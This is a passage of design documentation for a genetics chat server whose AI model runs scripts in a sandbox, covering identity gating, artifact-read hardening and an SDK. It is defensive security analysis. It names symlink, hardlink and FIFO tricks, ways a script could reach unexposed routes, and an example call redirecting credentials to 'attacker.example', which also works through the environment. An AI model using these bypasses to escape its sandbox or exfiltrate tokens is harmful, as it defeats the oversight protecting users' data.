`error`, `error_type`, `traceback`, `limit_exceeded` and a `hint`. Two reasons for the
rebuild, and neither is that the contract's field set is closed — it is not, an unknown
`status` renders as itself and counts as not-ok, and an unrecognised `error.type` is a
label to display rather than something switched on:

- **`execution_id` must not reach the model.** It is the join key for the audit trail and
  for the manifest chat-backend records against the `jti`/`sid`; putting it in context
  invites a model-*supplied* one back in, which is what artifact resolution rules out.
- **A manifest entry is `name`/`size`/`content_type` and nothing else** — no path, no id,
  no URL — so entries are rebuilt to that shape and malformed ones dropped.

The failure half is deliberately as detailed as the success half: a failing script costs a
full model roundtrip, and the epic's measurements put a third of all spend in the tail of
turns with 6+ roundtrips. So the error carries the exception type, the traceback tail, and
which limit fired, plus a hint that points at `list_capabilities` when the type suggests
the SDK was called differently from how it is defined.

**Image artifacts come back automatically; nothing else comes back at all, and every tool
description says so.** After a `status: ok` run, `_fetch_analysis_images` reads the manifest,
takes up to four entries whose `content_type` starts with `image/` and whose listed size is
under the sandbox's 512 KiB per-read cap, and fetches each over the supervisor's
`GET /artifact` route (`genetics-results-suite-8z1`; contract in
`genetics-results-suite/docs/code-execution-security.md` §2). They ride on the result under
`images`, and `_stream_anthropic` streams each as an `image` chunk and **strips the key
before the dict is serialised into the `tool_result`** — base64 in context is tokens paid for
something the model cannot see. The `execution_id` used for the fetch comes from the
supervisor's own echoed response and is still kept out of everything the model reads.

Every **other** artifact's contents remain unretrievable, and `run_analysis`'s description,
its `artifacts_note` and `read_artifact`'s description all say so. `read_artifact` is
unchanged and does **not** use the new route: it reads a local directory in this process that
is not the sandbox's `/scratch`, and `SANDBOX_ARTIFACTS_DIR` is set nowhere in the deployment.
General artifact reads and the sid-scoped resolution are still
`genetics-results-suite-4h6.52`. A model told it can fetch a table spends a roundtrip finding
out it cannot.

**The SDK is importable as `genetics`, which is what everything already called it.** The
package is `genetics_mcp_server.sdk`; the sandbox image installs a `sys.modules` alias
(`sandbox/genetics_alias.py` in genetics-results-suite) so `import genetics` resolves to
the same object — not a copy, which would give `configure()` two pieces of client state.
Before that, every tool description, the `list_capabilities` module enum, the shipped
`genetics.pyi` stub and the schema README all said `genetics` while only
`genetics_mcp_server.sdk` imported, and the one place the true line lived — `sdk.__doc__` —
is deliberately stripped from the catalogue. Nothing reachable from inside an execution
stated it, so every measured session opened with `import genetics` → `ModuleNotFoundError`,
a second wrong guess and three `pkgutil` probes: six executions before any real work
(`genetics-results-suite-706`). The catalogue now also returns the import line on every
response, so the fix does not depend on the image alone.

**`run_analysis` is the one tool that fails closed without a chat session, and a client
must have one before it sends the turn.** The executor refuses a call with no `user` or no
`session_id` — `SandboxNotConfigured`, `retryable: False` — because those two become the
`sub`/`sid` of the per-execution JWTs and so of every audit record, the artifact retention
scope and the per-`jti` budgets. There is no placeholder that would be honest. The failure
is a **wiring** fault, not a script fault, and is logged at `ERROR` as
`run_analysis called without an authenticated identity (user=… session=…)` with the two
booleans, precisely so an operator can tell which half is missing.

**An authenticated caller is not enough — the dispatch requires a real person.** The
executor also refuses a `run_analysis` whose `user` is the `mcp-tool` service identity
(`auth.core.SERVICE_IDENTITY`), with the same `SandboxNotConfigured` / `retryable: false`
shape and an `ERROR` log line. This is the MCP-exclusion boundary, and it is one hop
longer than the network layer covers (`genetics-results-suite-4h6.27`): the NetworkPolicy
closes mcp-server → sandbox, but mcp-server holds `INTERNAL_API_SECRET` and is admitted to
chat-backend:8000, and a valid marker with no identity header resolves to exactly that one
service string (`genetics-results-suite-th2`) — so mcp-server → chat-backend → sandbox was
open. The check sits at the **tool dispatch**, not on the HTTP route, because that is the
narrow waist every execution passes (streaming chat, non-streaming chat, subagent
dispatch, anything added later) and because it sits immediately before
`mint_execution_tokens`, so no credential can be minted for a subject that was refused. A
route-level check would guard only the routes someone remembered to decorate, and would
also refuse plain chat, which the marker identity may legitimately use.

**And the dispatch requires a secret only auth-gateway holds, not merely a marker**
(`genetics-results-suite-4h6.84`). The guard above catches the marker-*alone* caller, i.e.
`auth_required`'s case 3. Case 1 beats case 3: an identity header, once present, decides the
outcome, so any holder of `INTERNAL_API_SECRET` could send
`X-Goog-Authenticated-User-Email: someone@finngen.fi` alongside the marker, resolve to that
address rather than to `mcp-tool`, and have both per-execution JWTs minted with `sub` set to
the address it typed — `session_id` being client-supplied, the artifact scope and the audit
trail would then name a person who never asked. `run_analysis` therefore takes a keyword-only
`gateway_asserted`, defaulting **False** so that a caller which states no provenance is refused
rather than trusted, and refuses with the same `SandboxNotConfigured` / `retryable: false`
shape when it is not set. `auth/dependencies.py:gateway_asserted_identity` computes it from
the request — `X-Gateway-Auth: $GATEWAY_IDENTITY_SECRET` **and** an identity header, the pair
that only a verified browser session produces — and `POST /chat/v1/chat` plumbs it through
`stream_chat` → `_stream_anthropic` → `_execute_tool`, where it is injected alongside the
authenticated `user`/`session_id` and stripped from the model's input for the same reason they
are. `GATEWAY_IDENTITY_SECRET` is a **distinct secret** from `INTERNAL_API_SECRET`
(`gateway-identity-secret` in `genetics-secrets`), mounted into auth-gateway and chat-backend
only; `auth/core.py:is_gateway_caller` compares it constant-time and answers **False** whenever
it is unset, so a deployment that never provisioned it refuses code execution rather than
admitting everyone. The first version of this gate keyed on the *transport* — the marker
arriving in `X-Internal-Auth` rather than `Authorization: Bearer` — and was measurably
bypassable, because mcp-server and results-api hold `INTERNAL_API_SECRET` by design and pick
their own header names; a header name is not a secret. Bound, so it is not read as more than it
is: a compromised auth-gateway, or a leak of `GATEWAY_IDENTITY_SECRET` to any pod that can
reach chat-backend:8000, still reaches this dispatch, and it is gated on `REQUIRE_AUTH` exactly
as `auth_required`'s first branch is — under `REQUIRE_AUTH=false` there is no proxy to assert
anything and it stands down with the rest of authentication. The suite spec's
`docs/code-execution-security.md` §5 "Layer 2c" owns the cross-repo statement.

That made the browser's lazy session creation a bug rather than a preference
(`genetics-results-suite-vda`): a chat started by typing created its session *after* the
exchange, so the first turn arrived with `session_id: null` and could not run code, while
every other tool worked and hid it. The client now resolves the session before the request
(`LLMChat`'s `onEnsureSession`). Any other surface embedding the chat needs the same — a
session id, or a client-minted conversation id as secret chats use.

**The tool-use indicator mirrors the identity strip; the length cap is a log concern
only.** The `tool_use` chunk and its log line are rendered from the raw `tool_use.input`,
one layer above the strip in `_execute_tool`, so a model-invented `user` would be logged
and streamed as if it were a real argument even though it never reaches the handler — and
in a log join that reads as identity. `_stream_anthropic` drops `user`/`session_id` from
the displayed input for `run_analysis` (the authenticated pair is already on every line
via `log_prefix`). `_loggable_tool_input` cuts `code` to `_LOG_CODE_CHARS` (400) with a
total-length marker so a 256 KiB script does not land in one log line.

The **stream** carries the input whole (`genetics-results-suite-inp`). Until then the tool
call reached the client as markdown prose — `*[Using tool: name; code: …]*` — truncated to
the same 400 chars, which meant the field the user most needed to read was the one field
guaranteed to be cut off, with nothing to expand. It is now a structured `tool_use` SSE
event the client renders as a collapsed disclosure. Stored history still holds the prose
markers for every turn predating the change; `_TOOL_USE_MARKER_RE` matches both those and
the client-written `[TOOLUSE:<base64>]` marker that replaced them, so neither shape reaches
the model on replay.

**The turn budget is this layer's, not the transport's** (`ToolExecutor._RUN_ANALYSIS_DEADLINE_S`,
300 s, applied with `asyncio.wait_for`). `sandbox_client` bounds each *attempt* correctly
and deliberately offers no total, because its per-attempt read deadline is derived from the
supervisor's own worst-case hold time (120 s queued + `timeout_s` + 15 s margin). The
attempts sum, though: 5 + 10 + 255, a 60 s `Retry-After`, then another 270 is ~585 s, and
ten minutes inside one tool call is not a chat turn. 300 s is the smallest cap that never
truncates a legitimate single attempt (270 s at the maximum `timeout_s`), so raising
`timeout_s` trades away the retry rather than the run. Exceeding it reports
`TurnBudgetExceeded` and says the script may still be running — a shape the benchmark
buckets on its own, since it is neither cleanly a script failure nor cleanly an
infrastructure fault (a single script cannot reach a 300 s cap against a 120 s
`MAX_TIMEOUT_S`). `SandboxUnavailable` is unambiguously infrastructure: a deploy left no
sandbox for up to ~130 s (`strategy: Recreate` plus `terminationGracePeriodSeconds: 130`).
`SandboxRejected` and the blank-script `EmptyScript`, by contrast, are the model's own
doing — it chose the `timeout_s`, the code size or the empty string.

**`SandboxTokenUnavailable` is caught first and by name, and `run_analysis` has no
`except Exception` at all** — a deliberate departure from the ~40 handlers around it.
`mint_execution_tokens` raises it (a plain `RuntimeError`) when `SANDBOX_TOKEN_SIGNING_KEY`
is unset. The house style would catch it and hand the model an ordinary "tool failed";
that is not a security hole, since the client raises before any request and no credential
is ever sent, but it turns an operator-visible misconfiguration into a model-visible
failure the model then retries against a sandbox that can never work. It is reported as
`SandboxNotConfigured` with `retryable: False`, and `tests/test_code_execution_tools.py`
pins both the behaviour and — by parsing the handler's AST — the clause ordering.

**Exposure decision**: `run_analysis` and `read_artifact` are in the `_mcp_disabled`
literal in `mcp_server.py`. This is a security control, not a product decision — the user
requires that code execution is not reachable via MCP. `run_analysis` additionally has
**no `register_mcp_tools` block at all**, which is a second registration-layer control
that no configuration can undo, since `disabled_tools` can only subtract: the entry in
`_mcp_disabled` is the half an env-driven `disabled_tools` and a future refactor can
disturb, and it is what would catch a block added later. Both are asserted against the
*registered tool list* rather than against the constant. Note what does **not** protect
anything here: `register_mcp_tools` is called with no profile, and `tool_profile=None`
means no filtering at all, so "the MCP server does not select the `code` profile" is
precisely the condition under which an unguarded tool would be registered.
`list_capabilities` is deliberately **not** excluded: what it renders is per-function SDK
signatures and docstrings, which describe the SDK's shape rather than data, session state
or any execution, and an exclusion set padded with harmless names stops reading as a
security control. That surface is genuinely new disclosure to an MCP client — the SDK is
not the MCP tool surface — and is judged acceptable on its content, not on being visible
elsewhere. **Module-level** docstrings are stripped from the output for exactly that
reason: `sdk.__doc__` names the endpoint and credential env vars (`GENETICS_API_URL`,
`BIGQUERY_API_URL`, `INTERNAL_API_SECRET`) and the services behind them, none of which is
needed to write a call. The index's one-line module summaries are written in `executor.py`
(`_SDK_MODULE_SUMMARIES`) rather than sliced out of `__doc__`. What that does **not**
remove, and the justification must not pretend otherwise: function docstrings describe
the SDK, so they disclose SDK internals by **category**. The categories are the claim;
the examples are illustrative, not an enumeration (enumerating them precisely has been
attempted twice and been incomplete both times):

- the **settings mechanism** — that endpoint URLs come from the environment and cannot be
  set from a script (`_URL_SETTINGS`, `configure`);
- **internal service and component names** — `db-api`, the FinnGen LD server, the sandbox;
- the **execution model** behind an argument — e.g. that `limit=` still runs the full join
  and `ORDER BY` server-side;
- **limit and quota values** — the per-execution row cap, the per-query and per-execution
  byte quotas, and the SDK's own row ceilings.

Rewriting them is a separate decision (it would also drift the generated
`sandbox/stubs/*.pyi`). Bare `<view>` names are deliberately absent from that list: they
already appear in MCP tool descriptions, so they are not new disclosure. The dataset
holding them is never named anywhere this server emits — SQL leaves here unqualified and
db-api resolves it against its own `DATASET_ID` — so there is nothing to disclose.

**Where the artifact read happens**: `read_artifact` reads the single directory named by
`SANDBOX_ARTIFACTS_DIR`, and returns "code execution is not enabled" when it is unset —
which is everywhere today. Chat-backend never sets it; retrieval there proxies over HTTP
to the sandbox pod, where the filesystem read happens — except that **no such client exists**:
`genetics-results-suite-4h6.52` owns that proxy hop and the session-scoped name resolution, and
neither is implemented. Earlier drafts named `4h6.11`, which was the SDK extraction and closed
without doing either. The allow-list is its own variable on purpose: the
obvious alternative, `SUBAGENT_ALLOWED_PATHS`, is `/data` in the deployment — the PVC
holding `chat_history.db` and `llm_config.db` — so wiring artifact reads to it would hand
the model every conversation in the deployment.

Two structural checks fail closed to "not enabled" before any name is looked at, both in
`_artifacts_dir()`. Both are **advisory**: they answer about a path string, and the answer
is stale the moment it returns (see the descriptor check below).

- **the configured directory may not itself be a symlink** (`lstat` + `S_ISLNK`).
  `_validate_path` resolves both sides, so a symlinked allow-list root makes every file
  under its target validate. The child uid owns `/scratch/<id>`, so it can `rmdir` its
  `artifacts` and relink it at another execution's retained artifacts — the cross-session
  channel the suite's `docs/code-execution-security.md` section 6.4 exists to prevent.
- **the resolved directory must sit under the hardcoded `_ARTIFACTS_DIR_PREFIX`
  (`/scratch/`)**. `read_artifact` is registered in the chat backend, so without this the
  only thing preventing `SANDBOX_ARTIFACTS_DIR=/data` from base64'ing `chat_history.db`
  back to the model is that nobody sets it. chat-backend has no `/scratch` volume, so the
  misconfiguration is unreachable rather than merely unmade.

Then, per read: the name check rejects separators, `..`, NUL and absolute paths before
touching the filesystem, and `skills/sandbox_tools.py:_validate_path` re-checks the
*resolved* path. **Neither is the enforcing layer** — a script owns its artifacts directory
and can swap what a name resolves through after the check, at the final component *or at
the `artifacts` directory itself*, and `_validate_path` cannot see the latter because it
resolves both sides through the same swapped link and they agree. So after those checks
nothing is addressed by path again:

- `_open_artifacts_dir()` opens the directory once with `O_RDONLY | O_DIRECTORY |
  O_NOFOLLOW` and checks **that descriptor** — `readlink("/proc/self/fd/<dirfd>")` must sit
  under `_ARTIFACTS_DIR_PREFIX` and must not be `" (deleted)"` — rather than re-resolving
  the path;
- the artifact is opened **relative to that fd** (`dir_fd=`) with `O_RDONLY | O_NOFOLLOW |
  O_NONBLOCK`, so a later directory swap changes a name the read no longer uses;
- regular-file, link-count and content all come from that one fd's `fstat`. `O_NOFOLLOW`
  refuses a symlink at the final component; `st_nlink != 1` refuses a hardlink, which has
  nothing to resolve and so passes both path layers while pointing at an out-of-tree inode;
  `O_NONBLOCK` is what makes the FIFO case reachable at all — `O_RDONLY` on a writerless
  FIFO blocks in the kernel before `S_ISREG` is tested, so a script could hang the chat
  backend with one `mkfifo` in its own artifacts directory.

The reported `size` is the payload length, not `st_size`, so a file that grows mid-read
cannot report a size that disagrees with the bytes returned. Every failure — outside the
allow-list, symlink, hardlink, FIFO, directory swap, `OSError` — is reported as "not
found", so probing discloses nothing, and the oversize refusal omits the byte count so it
is not a size oracle. A `_validate_path` refusal does return measurably faster than one
from the open, which tells a caller whether a name **it planted** is an out-of-tree
symlink; a dangling symlink takes the same fast path, so it is not an existence oracle.

**Not implemented**: cross-execution scoping. `read_artifact` takes no session or execution
argument, so which execution's artifacts are reachable rests entirely on
`SANDBOX_ARTIFACTS_DIR` pointing at the right directory. Resolving a name against a session
belongs to `genetics-results-suite-4h6.52` and has not been implemented.

#### Open Targets Platform MCP

| Tool | Description |
|------|-------------|
| `get_open_targets_graphql_schema` | Retrieve the Open Targets Platform GraphQL schema for query construction |
| `search_entities` | Search for targets, diseases, drugs, variants, and studies by name |
| `query_open_targets_graphql` | Execute GraphQL queries against the Open Targets Platform API |
| `batch_query_open_targets_graphql` | Execute the same GraphQL query with multiple variable sets |

## Tool Profiles

The chat API supports a `tool_profile` parameter that controls which tools are available per request. This enables A/B testing of different tool strategies (API vs BigQuery vs RAG vs code execution) by sending identical prompts with different profiles.

Two mechanisms resolve a profile, in `tools/definitions.py`. `TOOL_PROFILES` maps a profile to whole **categories**; `TOOL_PROFILE_TOOLS` maps a profile to an explicit list of tool **names** and takes precedence. The second exists for `code`, whose surface cannot be written as categories — its orchestration tools share a category with `launch_subagents`, which must stay out — and recategorising tools to make it fit was ruled out, since a tool's `category` also decides what the `api` profile advertises and what subagent skills declaring `tool_categories={"general","api"}` can call.

### Tool categories

Each tool has a `category` field in its definition:

| Category | Description |
|----------|-------------|
| `general` | Always available: search_phenotypes, search_genes, lookup_variants_by_rsid, lookup_phenotype_names, list_datasets, get_resource_metadata, get_dataset_display_names, search_scientific_literature, web_search, search_mgi, search_cbioportal, get_protein_annotations, map_protein_variants, get_variant_protein_effect, search_uniprot, create_phewas_plot, get_gene_group_members, normalize_gene_symbols |
| `api` | Local genetics API tools: credible sets, gene data, colocalization, phenotype report, variant annotations, etc. |
| `bigquery` | BigQuery SQL tools: query_database, get_database_schema |
| `orchestration` | Main-agent-only tools: launch_subagents, run_analysis, list_capabilities, read_artifact. `subagent.py` drops all four **by name** (the category is in the `api` and `bigquery` profiles, so it is not itself an exclusion), to prevent recursive launches, to keep code execution on the one path that holds the authenticated identity, and to keep a subagent away from another execution's artifacts. |

### Profile behavior

| `tool_profile` value | Local tools | External tools |
|----------------------|-------------|----------------|
| `null` (default) | no filtering at all — every definition | always-on (gnomAD, OT) + RAG |
| `"api"` | general + api + orchestration | always-on only |
| `"bigquery"` | general + bigquery + orchestration | always-on only |
| `"rag"` | general only | RAG only |
| `"code"` | exactly 7 by name: run_analysis, list_capabilities, read_artifact, search_genes, search_phenotypes, search_scientific_literature, lookup_variants_by_rsid | **none** |
| any other string | general only (silent fallback, no error) | always-on only |

Always-on external servers (gnomAD, Open Targets from `EXTERNAL_MCP_SERVERS`) are included in every profile except `"rag"` and the explicit-allow-list profiles — a `code` profile that named seven tools would not mean much with ~20 proxied tools appended. The RAG server (`RAG_MCP_SERVER`) is only included when `tool_profile` is `"rag"` or unset.

`code` (genetics-results-suite-4h6.16) **ships dark**: nothing defaults to it, the server-side default is still `null`, and it is selected per request (persisted in `chat_messages.tool_profile`, defaulted per user via the `chat_tool_profile` user setting). Rollback is deleting one dict entry. It deliberately omits `launch_subagents` — the profile measures what one agent does with a sandbox, not what a fan-out does. Its two "search_entities"/"search_literature" names from the bead do not exist in the codebase; the profile ships today's four search tools instead, and the consolidation into merged search tools remains a separate future decision. See `genetics-results-suite/docs/chat-tool-reference.md` § 3 for the resolved per-profile counts.

## Genetics SDK (`genetics_mcp_server.sdk`)

An importable data-access package sitting **over** `ToolExecutor`, for code that consumes
genetics data programmatically rather than through a tool schema. It is the data half of the
code-execution agent: a script in the sandbox imports it instead of the agent calling the
API-category tools one at a time. It wraps 40 of the 44; the four `api`-category tools it does
**not** wrap are `get_phenotype_report`, `get_credible_sets_stats`, `analyze_variant_list` and
`get_myvariant_annotations`. The "Deliberately **not** in the SDK" section below gives the
reasoning, but it is written across categories — its list also names `general`-category tools
such as `create_phewas_plot`, which was never one of the 44 — so it is not a substitute for
the four named here.

The four are excluded deliberately, but not for one shared reason, and the axis that separates
them is **not** whether the endpoint computes something server-side. It is whether the rows the
answer is built from sit somewhere a sandboxed script can read.

`analyze_variant_list` is a rollup over endpoints the SDK already wraps, so a script composes it
from primitives. `get_credible_sets_stats` aggregates nothing server-side at all — results-api
streams a pre-generated TSV out of GCS, the same storage pattern as the phenotype report — yet
its underlying rows are `credible_sets_v`, which `sql()` reaches, so a script can compute the
same class of counts itself. Read "itself" strictly: the view carries the PIP, effect-size and
consequence columns the counts are built from, but the upstream's risk/protective convention
(taking the sign of the lead variant's beta is an inference, not a documented rule) and which
consequence terms it treats as coding versus loss-of-function are published nowhere the script
can see. Expect a script to produce defensible statistics, not necessarily *these* numbers.

`get_myvariant_annotations` is the one genuine unavailability: it targets a third-party host,
and no third-party target is permitted by the sandbox egress policy, so a wrapper for it would
be a function that cannot connect. `get_phenotype_report` is **not** in that class, and an
earlier version of this passage was wrong to put it there. Its gene scores and tier assignments
exist in no allow-listed view, so a script cannot recompute them — but results-api is a
permitted egress target, results-api is what serves the markdown, and the sandbox's credential
is not scoped per route, so the document is reachable from a script by a hand-rolled HTTP call.
What the SDK's omission costs is the affordance, not the data: neither the SDK nor the sandbox
stubs name that route, so a model would have to invent the request rather than call something
put in front of it. That is a discoverability and convenience asymmetry, not an availability
one, and inventing the call is not the intended way to use the sandbox.
`genetics-results-suite-4h6.23` should still exclude or explicitly book questions that lean on
either tool — but for those two different reasons, and without scoring the code-execution arm
down as though both were unreachable. The egress allow-list and the credential's scope are
specified and maintained in `genetics-results-suite` `docs/code-execution-security.md`; treat
that document as the authority for both rather than the summary here, which will age.

```python
import genetics_mcp_server.sdk as genetics
import polars as pl

df = genetics.credible_sets(gene="IL7R")
df.filter(pl.col("pip") > 0.5).join(genetics.mpra(gene="IL7R"), on="variant")
```

The MCP and chat tool surfaces are unchanged and still call `ToolExecutor` directly; the SDK
is an additional entry point, not a replacement.

### The grid collapse

The by-gene / by-variant / by-region / by-phenotype split that produced the near-duplicate
tool names is an **argument** here, not a function name. `_one_of()` in `sdk/client.py`
enforces that exactly one selector is supplied and refuses ambiguity rather than picking a
winner.

| SDK function | Executor methods it dispatches to |
|---|---|
| `credible_sets(gene=\|qtl_gene=\|variant=\|region=\|phenotype=[, credible_set_id=, leads_only=])` | `get_credible_sets_by_gene`, `_by_qtl_gene`, `_by_variant`, `_by_region`, `_by_phenotype`, `get_credible_set_by_id`, `get_credible_set_leads_by_phenotype` |
| `colocalization(variant=\|credible_set_id=+phenotype=)` | `get_colocalization`, `get_colocalization_by_credible_set` |
| `exome(gene=\|variant=\|region=\|phenotype=)` | `get_exome_results_by_gene`/`_variant`/`_region`/`_phenotype` |
| `gene_burden(gene=\|phenotype=)` | `get_gene_based_results`, `get_gene_based_results_by_phenotype` |
| `hla(phenotype=\|allele=)` | `get_hla_by_phenotype`, `get_hla_by_allele` |
| `asm_qtl(variant=\|gene=)` | `get_asm_qtl_by_variant`, `get_asm_qtl_by_gene` |
| `open_chromatin(variant=\|region=\|peak=\|gene=)` | `get_open_chromatin_by_variant`/`_region`/`_peak`/`_gene` |
| `peak_to_gene(peak=\|gene=)` | `get_peak_to_genes`, `get_gene_to_peaks` |
| `variant_effect(variant=\|gene=)` | `get_variant_effect_by_variant`, `_by_gene` |
| `mpra(variant=\|region=\|gene=)` | `get_mpra_by_variant`/`_region`/`_gene` |
| `mpra_pip_concordance(gene)` | `get_mpra_pip_concordance_by_gene` |
| `variant_annotation(variant=\|region=\|gene=\|variants=)` | `get_variant_annotations` (already collapsed) |
| `gene_annotations(region=\|nearest_to=\|group=)` | `get_genes_in_region`, `get_nearest_genes`, `get_gene_group_members` |
| `expression(gene)` | `get_gene_expression` |
| `gene_disease(gene)` | `get_gene_disease_associations` |
| `summary_stats(phenotypes=, variants=\|region=)` | `get_summary_stats`, `get_summary_stats_by_region` |
| `ld(variant[, other])` | `get_variants_in_ld`, `get_ld_between_variants` |
| `search(query=[, kind=]\|rsids=)` | `search_phenotypes`, `search_genes`, `lookup_variants_by_rsid` |
| `lookup_phenotype_names(codes)` | `lookup_phenotype_names` |
| `get_dataset_display_names()` | `get_dataset_display_names` |
| `normalize_gene_symbols(symbols)` | `normalize_gene_symbols` |
| `sql(query)` | `query_database` |
| `schema()`, `resources()`, `datasets()` | `get_database_schema`, `get_available_resources`, `list_datasets` |

`mpra_pip_concordance` stays a separate function rather than a keyword on `mpra()`: it is a
join of `credible_sets_v` and `mpra_v` and returns credible-set columns alongside MPRA
columns, so the row shape differs from every other `mpra()` result.

`hla()` is the one collapse whose two branches read **different stores**. `hla(phenotype=)`
reads the per-phenotype tabix files through results-api; `hla(allele=)` must go to BigQuery
`hla_associations_v` — no single file spans phenotypes. They nevertheless spell the
statistics the **same way**: `mlog10p`/`se`/`af`/`af_cases`/`af_controls`, so per-column
access is uniform and no renaming is ever needed. The column *sets* still differ:
`hla(allele=)` selects the 11 columns common to both, while `hla(phenotype=)` returns those
plus `resource`, `version`, `chr` and `pos` — 15 in all — so a bare `pl.concat` of the two
still fails on width and the shared 11 have to be selected explicitly first. The name
agreement is not free — `hla_associations_v`
renames FinnGen's native `mlogp`/`sebeta`/`af_alt`/`af_alt_cases`/`af_alt_controls` in the
view definition (`genetics-results-db/schemas/hla_associations_v.sql`); the staged file and
the `hla_associations` table underneath still carry the native spelling. The rename is 1:1
on byte-identical values, and the view is what every consumer reads. The trait column is
`phenotype` in both branches, a third convention next to the `trait`/`phenocode` used
elsewhere in the suite; `hla_associations_v` has no `trait` or `trait_original` at all. Both branches
preserve column names on an empty result: the `allele=` branch via the
`with_metadata=True` / `columns` path the BigQuery functions use, the `phenotype=` branch
via the `X-Columns` response header results-api added for
`genetics-results-suite-6uk` (see "Empty results keep their schema").

Deliberately **not** in the SDK: the external/third-party tools (literature, web search, MGI,
cBioPortal, myvariant, UniProt), the presentation tools (`create_phewas_plot`,
`analyze_variant_list`, `get_credible_sets_stats`) and `get_phenotype_report`. The first group is
not genetics-results data; the second is model-facing summarisation that a script writes for
itself. `get_phenotype_report` sits next to that second group but does not belong to it: its gene
scores and tier flags are in no view a script can query, so a script cannot write the report for
itself — it can only fetch the document results-api serves.

**"Not in the SDK" does not mean "not reachable", and this list is not an enforcement boundary.**
`GeneticsClient` keeps the full `ToolExecutor` on `._executor` — and reaching it needs no client
at all: `tools/executor.py` is on `sandbox/prune_venv.py`'s `SDK_ALLOWLIST` (it ships because
`sdk/client.py` imports `ToolExecutor` directly), so a sandboxed script can simply
`from genetics_mcp_server.tools.executor import ToolExecutor` and construct its own. httpx ships
too, as the SDK's own transport. The leading underscore is **curation, not enforcement**: it marks
the executor as outside the curated surface so that a reader or a model does not treat it as a
recommended entry point, and it should never be cited as a control. The containment boundary, **as
specified**, is the sandbox's deny-by-default **network egress allow-list** (db-api and results-api
only) in `genetics-results-suite` `docs/code-execution-security.md` — specified rather than live:
the sandbox is not deployed, and that policy stays decoration until `genetics-results-suite-4h6.7`
ships a Deployment carrying the labels it selects.

Reachability therefore divides this list along a different axis than the one that put tools on
it. The third-party tools **are** genuinely unreachable from a sandboxed script — but for the
network reason, not the SDK one: no permitted egress target serves myvariant.info, Europe PMC,
MGI, cBioPortal, UniProt or a web-search API (Perplexity/Tavily), so reaching
`get_myvariant_annotations` through `._executor` still fails to connect. The presentation tools and `get_phenotype_report` are **reachable**: results-api is a
permitted target and the sandbox credential is not scoped per route, so `._executor` or a
hand-rolled httpx call gets them. For those, what the omission costs is the affordance and not
the data — the discoverability and convenience asymmetry the SDK coverage passage above
describes, not an availability one. Same list, two different reasons, and the reason is the
point (`genetics-results-suite-4h6.33`).

`credible_sets`, `summary_stats` and `gene_burden` all return trait **codes** (`I9_CHD`), and
`search(kind="phenotypes")` is the fuzzy ranked index rather than a lookup, so
`lookup_phenotype_names` and `get_dataset_display_names` are the code→name resolvers.
`normalize_gene_symbols` returns **one row per input** with `input`/`symbol`/`resolved`/
`matched_on`, so the unresolved inputs are rows with a null `symbol`
(`df.filter(pl.col("symbol").is_null())`) rather than a second list that a DataFrame cannot
carry — without it a script cannot canonicalise a user-supplied gene list before calling
`credible_sets(gene=...)`.

### Contract

- **Return type is `polars.DataFrame`** for every row-returning function. Scripts filter and
  join, which is what a DataFrame is for, polars is already a dependency, and it is already
  what `executor.py`'s own summarisers use. `schema()`, `resources()` and `datasets()` return
  dicts because their payloads are nested rather than tabular.
- **Failures raise `GeneticsError`**; argument-shape mistakes raise `GeneticsUsageError`. The
  tool layer's `{"success": False, "error": ...}` exists because a model reads the dict; a
  script author does not check a flag after every call, and an unchecked failure would
  otherwise read as an empty frame.
- **No knowledge of HTTP required, and endpoints are not a parameter.** Endpoints come from
  the environment (`GENETICS_API_URL`, `GENETICS_PUBLIC_API_URL`, `BIGQUERY_API_URL`).
  Credentials depend on where the SDK is running: **inside the sandbox** it attaches the
  per-execution token pair the supervisor named to the child by path in `SANDBOX_TOKEN_FILE`,
  per request and bound to the destination's audience, and never `INTERNAL_API_SECRET`
  (`genetics-results-suite-4h6.44`, landed; `tools/executor.py` `_load_sandbox_tokens` /
  `_SandboxTokenAuth`); **outside it** — the service processes and local runs — it attaches
  `INTERNAL_API_SECRET`. The two are mutually exclusive with no fallback, because the shared
  secret satisfies `is_internal_caller` and is served with no per-execution accounting at all
  (`genetics-results-suite-0lf`). A pruned (sandbox) install that reaches client construction
  with neither raises rather than sending requests unauthenticated.
  Neither `configure()` nor `GeneticsClient()` accepts a URL, since the client credentials
  every request to whatever base URL it holds
  (`genetics.configure(api_base_url="http://attacker.example/api"); genetics.expression("APOE")`);
  `configure()` raises `GeneticsUsageError` on any URL setting. **That is tidiness, not a
  boundary, and must not be cited as one**: the sandbox child is forked without exec, so the
  script owns `os.environ` too, and setting `GENETICS_API_URL` before the SDK's first use
  (the URL reads are `cached_property`, and `sdk/__init__` holds `_client = None` until then)
  redirects the client and takes the token with it — measured. What contains a hostile script
  is the sandbox's deny-by-default egress allow-list plus `genetics-results-suite-4h6.55`; the
  per-execution token's value is that it is short-lived, audience-scoped and **attributable**.
  `_download_url` / `_download_data` are dropped — a script already holds the rows.
- **No inline row cap.** `ToolExecutor._row_limit` caps region results at 500 to protect the
  model's context window; `GeneticsClient` passes `row_limit=None` to the executor **it
  constructs**. An injected executor is never mutated: it may be the running service's shared
  one, and lifting its cap in place would flood the model's context at every MCP call site
  that relies on `_cap_rows`.
- **Truncation raises rather than returning a prefix.** Silent truncation is the one failure a
  script cannot detect — the frame is well-formed and merely missing rows, so every downstream
  count, mean and join is wrong with no signal. `_check_truncation` turns `truncated` /
  `download_capped_at_100k` into a `GeneticsError`.
- **Rows are named from the payload's own columns.** results-api returns JSON objects; db-api
  returns rows **positionally**, with names in a separate `columns` key. Handing positional
  rows to `pl.from_dicts` does not raise — it transposes them into `column_0`/`column_1` with
  every value stringified — so `_frame()` switches constructor on whether `columns` is present,
  and an empty result with `columns` keeps its schema so `.filter(pl.col(...))` still works.
  When `columns` is present but the rows are already dicts (the five by-gene tools, which now
  name their rows for the model), they are re-flattened against `columns`, so column order and
  schema come from `columns` in every case rather than from dict iteration order.
- **A branch that cannot honour an argument refuses it.** Dropping a filter silently is worse
  than rejecting it: `exome(gene=..., resources=[...])` that ignores `resources` returns *more*
  rows than asked for and the frame says nothing. `_reject()` raises `GeneticsUsageError` in
  eight functions — re-derive from `grep -n '_reject(' src/genetics_mcp_server/sdk/client.py`
  rather than trusting this list: `credible_sets` (any selector alongside `credible_set_id`;
  `window` off the gene branch, `coding_only` off region, `leads_only` off phenotype,
  `data_types` on region/phenotype), `colocalization` (`variant` alongside `credible_set_id`;
  `resource`/`dual_format` on the `variant=` branch), `exome` (`resources` on gene/phenotype,
  `resource` off phenotype), `gene_burden` (`resource` on the gene branch), `hla`
  (`min_mlogp`/`min_info`/`limit` on the `phenotype=` branch, `genes` on `allele=`),
